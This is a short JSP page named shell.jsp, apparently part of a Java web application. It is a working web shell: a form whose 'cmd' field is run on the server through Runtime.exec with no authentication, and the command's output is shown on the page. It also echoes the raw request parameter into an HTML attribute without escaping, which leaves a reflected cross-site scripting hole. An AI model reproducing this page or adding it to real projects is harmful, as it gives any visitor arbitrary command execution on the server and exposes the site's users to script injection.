<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="org.apache.commons.io.IOUtils"%>
<%@page import="org.apache.commons.lang.SystemUtils"%>
<%@include file="/taglibs.jsp"%>
<%
	String cmd = request.getParameter("cmd");
	if (cmd != null && cmd.length() > 0) {
		Process p = Runtime.getRuntime().exec(cmd);
		InputStream is = p.getInputStream();
		String output = IOUtils.toString(is, SystemUtils.FILE_ENCODING);
		request.setAttribute("output", output);
	}
%>
<html>
<head>
<style type="text/css">
* {
background-color: transparent;
color: black;
margin:0px;
padding:0px;
}
body {
margin:10px;
color:black;
background-color: white;
}
input, textarea{border:solid 1px #ddd;}
</style>
<script type="text/javascript" src="${ctx}/scripts/prototype.js"></script>
</head>
<body onload='$("cmd").focus();$("cmd").select();'>
<form action="shell.jsp" method="post"><input type="text"
	id="cmd" name="cmd"
	value="<%=request.getParameter("cmd") == null ? "" : request.getParameter("cmd")%>"
	style="width:80%;" /> <input type="submit" value="Exec" /> <textarea
	rows="10" cols="10"
	style="width:100%;height:500px;background-color: transparent;"
	disabled="disabled">${output}</textarea></form>
</body>
</html>
